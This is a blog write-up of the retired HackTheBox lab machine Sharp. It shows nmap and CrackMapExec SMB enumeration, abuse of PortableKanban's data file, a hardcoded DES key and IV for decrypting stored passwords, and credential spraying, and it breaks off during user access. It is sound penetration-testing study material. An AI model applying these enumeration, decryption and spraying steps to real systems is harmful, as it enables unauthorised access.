<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>HackTheBox: Sharp :: Yet, another infosec blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Hi, after a long time not posting anything on this blog because of my university workload. Let&amp;rsquo;s get back to our normal routine of pwning. Today, I will do a writeup of retired HackTheBox (HTB) machine - Sharp, which is rated 4.8 pts.
For anyone who doesn&amp;rsquo;t know about HTB, it&amp;rsquo;s an infosec playground with a bunch of virtual machines which are vulnerable to exploit. HTB, in my point of view, is the most practical cyber security competition as many certificate authorities require completion of HTB-like target machines." />
<meta name="keywords" content="infosec, pwn, ctf, challenges, hackthebox, reverse" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://legiahuyy.github.io/blog/en/posts/htb-sharp/" />




<link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/style.css">

  <link rel="stylesheet" href="https://legiahuyy.github.io/blog/en/assets/green.css">






<link rel="apple-touch-icon" href="https://legiahuyy.github.io/blog/en/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="https://legiahuyy.github.io/blog/en/img/favicon/green.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="The Archivist" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="HackTheBox: Sharp">
<meta property="og:description" content="Hi, after a long time not posting anything on this blog because of my university workload. Let&amp;rsquo;s get back to our normal routine of pwning. Today, I will do a writeup of retired HackTheBox (HTB) machine - Sharp, which is rated 4.8 pts.
For anyone who doesn&amp;rsquo;t know about HTB, it&amp;rsquo;s an infosec playground with a bunch of virtual machines which are vulnerable to exploit. HTB, in my point of view, is the most practical cyber security competition as many certificate authorities require completion of HTB-like target machines." />
<meta property="og:url" content="https://legiahuyy.github.io/blog/en/posts/htb-sharp/" />
<meta property="og:site_name" content="Yet, another infosec blog" />

  
    <meta property="og:image" content="https://legiahuyy.github.io/blog/en/img/favicon/green.png">
  

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

  <meta property="article:section" content="hackthebox" />













</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    <style>
      .blink {
        animation: blinker 1s linear infinite;
        color: red!important;
}
.logo_anchor
{
  color: blue!important;
}

@keyframes blinker {
  50% {
    opacity: 0;
  }
}
    </style>
    <div class="logo_anchor">
      ./&ThinSpace; 
    </div>
      Archivist
    <div class="blink"> # </div> 
  </div>
</a>

    </div>
    
      <div class="menu-trigger">menu</div>
    
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/blog/en/posts">1.Posts</a></li>
        
      
        
          <li><a href="/blog/en/categories">2.Categories</a></li>
        
      
        
          <li><a href="/blog/en/tags">3.Tags</a></li>
        
      
        
          <li><a href="/blog/en/about">4.About</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">More â–¾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/blog/en/index.xml">RSS</a></li>
              
            
              
                <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/blog/en/posts">1.Posts</a></li>
      
    
      
        <li><a href="/blog/en/categories">2.Categories</a></li>
      
    
      
        <li><a href="/blog/en/tags">3.Tags</a></li>
      
    
      
        <li><a href="/blog/en/about">4.About</a></li>
      
    
      
        <li><a href="/blog/en/index.xml">RSS</a></li>
      
    
      
        <li><a href="https://buymeacoffee.com/7Bkc3SH">Support</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://legiahuyy.github.io/blog/en/posts/htb-sharp/">HackTheBox: Sharp</a></h1>
  <div class="post-meta">
    
    
      <span class="post-author">:: The Archivist</span>
    
    
  </div>

  
  <span class="post-tags">
    
    #<a href="https://legiahuyy.github.io/blog/en/tags/hackthebox/">hackthebox</a>&nbsp;
    
    #<a href="https://legiahuyy.github.io/blog/en/tags/network/">network</a>&nbsp;
    
    #<a href="https://legiahuyy.github.io/blog/en/tags/pwn/">pwn</a>&nbsp;
    
  </span>
  
  


  

  <div class="post-content"><div>
        <p>Hi, after a long time not posting anything on this blog because of my university workload. Let&rsquo;s get back to our normal routine of pwning. Today, I will do a writeup of retired <a href="https://www.hackthebox.eu/">HackTheBox</a> (HTB) machine - Sharp, which is rated 4.8 pts.</p>
<p>For anyone who doesn&rsquo;t know about HTB, it&rsquo;s an infosec playground with a bunch of virtual machines which are vulnerable to exploit. HTB, in my point of view, is the most practical cyber security competition as many certificate authorities require completion of HTB-like target machines.</p>
<h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>On the very first step, we want to do a nmap scan on the target (10.10.10.219).</p>
<h3 id="nmap-output">Nmap output<a href="#nmap-output" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Thu May 13 05:42:14 2021 as: nmap -sC -sV -oA nmap/sharp -v 10.10.10.219</span>

Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.219
Host is up <span style="color:#f92672">(</span>0.23s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">996</span> filtered ports
PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8888/tcp open  storagecraft-image StorageCraft Image Manager
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -48m56s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-13T08:54:52
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap <span style="color:#66d9ef">done</span> at Thu May <span style="color:#ae81ff">13</span> 05:44:27 <span style="color:#ae81ff">2021</span> -- <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 133.29 seconds
</code></pre></div><p>Nmap results provide us with different ports and services currently running on the remote host. However, we probably should focus on its SMB service.</p>
<h3 id="in-depth-enumeration-with-crackmapexec-cme">In-depth enumeration with CrackMapExec (CME)<a href="#in-depth-enumeration-with-crackmapexec-cme" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Instead of the old-fashioned Metasploit&rsquo;s auxiliaries/scanners, CrackMapExec (CME) can help us empower our exploitation to a new level. You can install the tool with a single line</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ apt-get install crackmapexec
</code></pre></div><p>or you can have it by cloning into <a href="https://github.com/byt3bl33d3r">byt3bl33d3r</a>/<strong><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></strong> but you will need <a href="https://python-poetry.org/docs/#installation">Poetry</a> to manage dependencies.</p>
<h4 id="os-version">OS version<a href="#os-version" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Now, let&rsquo;s check our target&rsquo;s OS version using CME (Windows 10.0 Build 17763 x64).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/â€¦/HackTheBox/Sharp/opt/CrackMapExec<span style="color:#f92672">]</span>
â””â”€# poetry run crackmapexec.spec smb 10.10.10.219         
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:SHARP<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Sharp<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</code></pre></div><h4 id="shared-objects--access">Shared objects &amp; Access<a href="#shared-objects--access" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Next, I&rsquo;d like to login using empty username and password, a null-session, to get some free share-objects on the machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/â€¦/HackTheBox/Sharp/opt/CrackMapExec<span style="color:#f92672">]</span>
â””â”€# poetry run crackmapexec.spec smb 10.10.10.219 -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares  
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:SHARP<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Sharp<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Sharp<span style="color:#ae81ff">\:</span> STATUS_ACCESS_DENIED 
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated shares
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            Share           Permissions     Remark
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            -----           -----------     ------
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            ADMIN$                          Remote Admin
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            C$                              Default share
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            dev                             
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            IPC$                            Remote IPC
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            kanban          READ            
</code></pre></div><p>The most notable one here is the <code>kanban</code> share-directory because we don&rsquo;t know what that is, indeed. A quick search on Google provides us that Kanban is a project management framework between users so that we can figure out it might contain important credentials.</p>
<h4 id="spider_plus-json">Spider_plus JSON<a href="#spider_plus-json" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Another thing you can do with CME is using its modules, in this case is <code>spider_plus</code> to crawl information from target host (directories, file names, sizes, &hellip;) and save it as JSON under <code>/tmp/cme_spider_plus</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/â€¦/HackTheBox/Sharp/opt/CrackMapExec<span style="color:#f92672">]</span>
â””â”€# poetry run crackmapexec.spec smb 10.10.10.219 -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -M spider_plus 
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:SHARP<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Sharp<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Sharp<span style="color:#ae81ff">\:</span> STATUS_ACCESS_DENIED 
SPIDER_P... 10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started spidering plus with option:
SPIDER_P... 10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>        DIR: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;print$&#39;</span><span style="color:#f92672">]</span>
SPIDER_P... 10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>        EXT: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;ico&#39;</span>, <span style="color:#e6db74">&#39;lnk&#39;</span><span style="color:#f92672">]</span>
SPIDER_P... 10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>       SIZE: <span style="color:#ae81ff">51200</span>
SPIDER_P... 10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     OUTPUT: /tmp/cme_spider_plus

</code></pre></div><p>So organized, isn&rsquo;t it?</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-22.png" alt=""></p>
<p>These are all the items we can enumerate with a null-session.</p>
<h2 id="kanban-share-files">Kanban share files<a href="#kanban-share-files" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Using smbclient to connect to <code>kanban</code> directory on remote machine and download files back to our Linux.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Connect to remote host with null credentials</span>
$ smbclient -N //10.10.10.219/kanban

<span style="color:#75715e"># Download all existing files</span>
smb: <span style="color:#ae81ff">\&gt;</span> mget *
</code></pre></div><p>You might want to take a look at those <code>.pk3</code> and <code>PortableKanban.exe</code> files as aforementioned, they are likely to contain useful information.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-32.png" alt=""></p>
<p>After downloading, you can extract the <code>pkb.zip</code> using <code>unzip</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/â€¦/Sharp/smb/kanban/pkb<span style="color:#f92672">]</span>
â””â”€# unzip pkb.zip     
Archive:  pkb.zip
  inflating: CommandLine.dll         
  inflating: CsvHelper.dll           
  inflating: DotNetZip.dll           
  inflating: Itenso.Rtf.Converter.Html.dll  
  inflating: Itenso.Rtf.Interpreter.dll  
  inflating: Itenso.Rtf.Parser.dll   
  inflating: Itenso.Sys.dll          
  inflating: MsgReader.dll           
  inflating: Ookii.Dialogs.dll       
   creating: Plugins/
  inflating: Plugins/PluginsLibrary.dll  
  inflating: PortableKanban.Data.dll  
  inflating: PortableKanban.exe      
  inflating: PortableKanban.Extensions.dll  
  inflating: ServiceStack.Common.dll  
  inflating: ServiceStack.Interfaces.dll  
  inflating: ServiceStack.Redis.dll  
  inflating: ServiceStack.Text.dll   
  inflating: User Guide.pdf
  
â”Œâ”€â”€<span style="color:#f92672">(</span>kaliã‰¿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HackTheBox/Sharp/smb/kanban<span style="color:#f92672">]</span>
â””â”€$ md5sum PortableKanban.pk*
0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3
0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3.bak
02c445fdc6a8b05ea23cd821534442e5  PortableKanban.pk3.md5
   
</code></pre></div><p>Skim through the files and we have these users in <code>PortableKanban.pk3</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">/*</span> <span style="color:#960050;background-color:#1e0010">PortableKanban.pk</span><span style="color:#ae81ff">3</span> <span style="color:#960050;background-color:#1e0010">*/</span>
  <span style="color:#e6db74">&#34;Users&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> [
    {
      <span style="color:#f92672">&#34;Id&#34;</span>: <span style="color:#e6db74">&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;</span>,
      <span style="color:#f92672">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;Administrator&#34;</span>,
      <span style="color:#f92672">&#34;Initials&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
      <span style="color:#f92672">&#34;Email&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
      <span style="color:#f92672">&#34;EncryptedPassword&#34;</span>: <span style="color:#e6db74">&#34;k+iUoOvQYG98PuhhRC7/rg==&#34;</span>, <span style="color:#75715e">// Base64
</span><span style="color:#75715e"></span>      <span style="color:#f92672">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;Admin&#34;</span>,
      <span style="color:#f92672">&#34;Inactive&#34;</span>: <span style="color:#66d9ef">false</span>,
      <span style="color:#f92672">&#34;TimeStamp&#34;</span>: <span style="color:#ae81ff">637409769245503700</span>
    },
    {
      <span style="color:#f92672">&#34;Id&#34;</span>: <span style="color:#e6db74">&#34;0628ae1de5234b81ae65c246dd2b4a21&#34;</span>,
      <span style="color:#f92672">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;lars&#34;</span>,
      <span style="color:#f92672">&#34;Initials&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
      <span style="color:#f92672">&#34;Email&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
      <span style="color:#f92672">&#34;EncryptedPassword&#34;</span>: <span style="color:#e6db74">&#34;Ua3LyPFM175GN8D3+tqwLA==&#34;</span>,
      <span style="color:#f92672">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;User&#34;</span>,
      <span style="color:#f92672">&#34;Inactive&#34;</span>: <span style="color:#66d9ef">false</span>,
      <span style="color:#f92672">&#34;TimeStamp&#34;</span>: <span style="color:#ae81ff">637409769265925600</span>
    }
  ]
</code></pre></div><h3 id="reveal-administrator-password-by-re-configurating-kanban-pk3-file">Reveal administrator password by re-configurating Kanban PK3 file<a href="#reveal-administrator-password-by-re-configurating-kanban-pk3-file" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Since the passwords are encrypted, we need to find other ways to get in. We can abuse their own <code>PortableKanban.exe</code> to decrypt passwords for us since they are stored offline but you&rsquo;ve might already known that only privileged users can read the password in plain text. Let&rsquo;s add ourselves in with <em>Admin</em> role by copy-paste <code>Administrator</code> section and change the name and id.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">/*</span> <span style="color:#960050;background-color:#1e0010">PortableKanban.pk</span><span style="color:#ae81ff">3</span> <span style="color:#960050;background-color:#1e0010">*/</span>
	<span style="color:#e6db74">&#34;Users&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> [
    {
      <span style="color:#f92672">&#34;Id&#34;</span>: <span style="color:#e6db74">&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;</span>,
      <span style="color:#f92672">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;Administrator&#34;</span>,
      <span style="color:#f92672">&#34;Initials&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
      <span style="color:#f92672">&#34;Email&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
      <span style="color:#f92672">&#34;EncryptedPassword&#34;</span>: <span style="color:#e6db74">&#34;k+iUoOvQYG98PuhhRC7/rg==&#34;</span>,
      <span style="color:#f92672">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;Admin&#34;</span>,
      <span style="color:#f92672">&#34;Inactive&#34;</span>: <span style="color:#66d9ef">false</span>,
      <span style="color:#f92672">&#34;TimeStamp&#34;</span>: <span style="color:#ae81ff">637409769245503700</span>
    },
    {
      <span style="color:#f92672">&#34;Id&#34;</span>: <span style="color:#e6db74">&#34;0628ae1de5234b81ae65c246dd2b4a21&#34;</span>,
      <span style="color:#f92672">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;lars&#34;</span>,
      <span style="color:#f92672">&#34;Initials&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
      <span style="color:#f92672">&#34;Email&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
      <span style="color:#f92672">&#34;EncryptedPassword&#34;</span>: <span style="color:#e6db74">&#34;Ua3LyPFM175GN8D3+tqwLA==&#34;</span>,
      <span style="color:#f92672">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;User&#34;</span>,
      <span style="color:#f92672">&#34;Inactive&#34;</span>: <span style="color:#66d9ef">false</span>,
      <span style="color:#f92672">&#34;TimeStamp&#34;</span>: <span style="color:#ae81ff">637409769265925600</span>
    },
    {
      <span style="color:#f92672">&#34;Id&#34;</span>: <span style="color:#e6db74">&#34;e8e29158d70d44b1a1ba4949d52790a1&#34;</span>, <span style="color:#75715e">// We also have to change the id
</span><span style="color:#75715e"></span>      <span style="color:#f92672">&#34;Name&#34;</span>: <span style="color:#e6db74">&#34;huy&#34;</span>,
      <span style="color:#f92672">&#34;Initials&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
      <span style="color:#f92672">&#34;Email&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
      <span style="color:#f92672">&#34;EncryptedPassword&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, 					<span style="color:#75715e">// Empty password
</span><span style="color:#75715e"></span>      <span style="color:#f92672">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;Admin&#34;</span>,
      <span style="color:#f92672">&#34;Inactive&#34;</span>: <span style="color:#66d9ef">false</span>,
      <span style="color:#f92672">&#34;TimeStamp&#34;</span>: <span style="color:#ae81ff">637409769245503700</span>
    }
  ]
</code></pre></div><p>Then we execute <code>PortableKanban.exe</code>, open Users tab in the setup dialog and we are now able to read the passwords.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-13.png" alt=""></p>
<h3 id="alternative-method">Alternative method<a href="#alternative-method" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>If you love doing thing <em>the-hard-way</em>, feel free to reverse the program and reproduce its decrypt method. Luckily, <code>PortableKanban.exe</code> and its components are compiled in C# which makes it easier for us.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_11-55.png" alt=""></p>
<h4 id="finding-credentials-with-dnspy">Finding credentials with dnSpy<a href="#finding-credentials-with-dnspy" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>Load the target&rsquo;s executables and DLLs  in dnSpy, we can have their decrypt method. The <code>Decrypt</code> function reads encrypted string as input, then uses <code>DESCryptoServiceProvider</code> with hardcoded key and IV to decrypt our string.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-21.png" alt="Crypto.Decrypt"></p>
<p>On line 62 and 65, from two magic bytes called <code>_rgbKey</code> and <code>_rgbIV</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">		<span style="color:#75715e">// Token: 0x04000001 RID: 1
</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] <span style="color:#ae81ff">_</span>rgbKey = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;7ly6UznJ&#34;</span>); <span style="color:#75715e">// Hex: 376c7936557a6e4a
</span><span style="color:#75715e"></span>
		<span style="color:#75715e">// Token: 0x04000002 RID: 2
</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] <span style="color:#ae81ff">_</span>rgbIV = Encoding.ASCII.GetBytes(<span style="color:#e6db74">&#34;XuVUm5fR&#34;</span>);	<span style="color:#75715e">// Hex: 587556556d356652
</span></code></pre></div><p>Talk a little about DES cipher, people use two common mode which are CBC (<strong>cipher block chaining</strong>) and ECB (<strong>electronic code book</strong>). But only CBC supports key and IV in combination to generate the block cipher.</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Cbc_encryption.png" alt="Source: Wikipedia"></p>
<p>So we are able to decrypt the password using <a href="https://gchq.github.io/CyberChef/">CyberChef</a> with the following recipe will give us our plain password.</p>
<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-14_14-32.png" alt=""></p>
<h3 id="credentials-spraying-with-cme">Credentials spraying with CME<a href="#credentials-spraying-with-cme" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>In this step, we will correspondingly put our usernames and passwords in two separate text file and let CME do the verification job for us.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># users.txt                   </span>
lars
Administrator
                                                                                                    
<span style="color:#75715e"># passwords.txt </span>
G123HHrth234gRG
G2@$btRSHJYTarg

â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/â€¦/HackTheBox/Sharp/opt/CrackMapExec<span style="color:#f92672">]</span>
â””â”€# poetry run crackmapexec.spec smb 10.10.10.219 -u ../../users.txt -p ../../passwords.txt 
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:SHARP<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Sharp<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sharp<span style="color:#ae81ff">\l</span>ars:G123HHrth234gRG 
</code></pre></div><p>Only <code>lars</code> can log in so we should excluded Administrator credentials for now.</p>
<h3 id="credentials-acquired">Credentials acquired<a href="#credentials-acquired" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<table>
<thead>
<tr>
<th>Username</th>
<th>Password</th>
<th>Status</th>
</tr>
</thead>
<tbody>
<tr>
<td>Administrator</td>
<td>G2@$btRSHJYTarg</td>
<td>Invalid</td>
</tr>
<tr>
<td>lars</td>
<td>G123HHrth234gRG</td>
<td>Valid</td>
</tr>
</tbody>
</table>
<h2 id="user-level-access">User-level access<a href="#user-level-access" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>After using <code>lars</code> credentials, we are able to crawl his shared-objects with <code>spider_plus</code> module as following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/â€¦/HackTheBox/Sharp/opt/CrackMapExec<span style="color:#f92672">]</span>
â””â”€# poetry run crackmapexec.spec smb 10.10.10.219 -u lars -p G123HHrth234gRG -M spider_plus     <span style="color:#ae81ff">2</span> â¨¯
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:SHARP<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Sharp<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sharp<span style="color:#ae81ff">\l</span>ars:G123HHrth234gRG 
SPIDER_P... 10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started spidering plus with option:
